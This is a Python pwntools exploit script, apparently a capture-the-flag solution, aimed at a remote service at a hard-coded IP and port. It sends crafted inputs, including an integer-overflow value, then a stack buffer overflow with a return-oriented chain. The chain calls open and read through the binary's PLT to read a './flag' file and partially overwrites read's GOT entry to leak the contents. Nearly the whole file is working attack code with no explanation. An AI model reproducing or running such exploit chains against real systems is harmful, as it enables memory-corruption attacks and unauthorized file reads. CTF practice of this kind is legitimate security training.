from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']


# p = process("./test")
p = remote("39.105.138.97",1234)
libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
elf = ELF("./test")

# gdb.attach(p,"b *0x80494c0")
# gdb.attach(p,"b *0x080492E2")
# gdb.attach(p,"b *0x0804925B")
# raw_input()

p.send('\x00'*2)
sleep(0.1)
p.send('./flag'.rjust(0x20,'a'))
sleep(0.2)
p.sendline("hello_boy")
sleep(0.2)
p.sendline("-2147483648")
sleep(0.2)
p.sendline("-1")

bss = 0x0804c07c-2

payload = 'a'*0x48+'b'*0x4
# payload += p32(elf.plt['read'])+p32(0x08049581)+p32(0)+p32(0x0804C060+0x100)+p32(0x100)
payload += p32(elf.plt['open'])+p32(0x08049582)+p32(bss)+p32(0)
payload += p32(elf.plt['read'])+p32(0x08049581)+p32(4)+p32(0x0804C060+0x200)+p32(0x100)
payload += p32(elf.plt['read'])+p32(0x08049581)+p32(0)+p32(elf.got['read'])+p32(0x100)
payload += p32(elf.plt['read'])+p32(0x08049581)+p32(1)+p32(0x0804C060+0x200)+p32(0x100)
# payload += p32(0x0804944B)
p.sendline(payload)

# gdb.attach(p,"b *0x080492E2")
# raw_input()
# p.send("./flag\x00")
p.send('\x30\xfe')
sleep(0.2)
flag = p.recv(timeout=1)
print flag
# if '{' not in flag:
#     p.close()
#     return 0
p.interactive()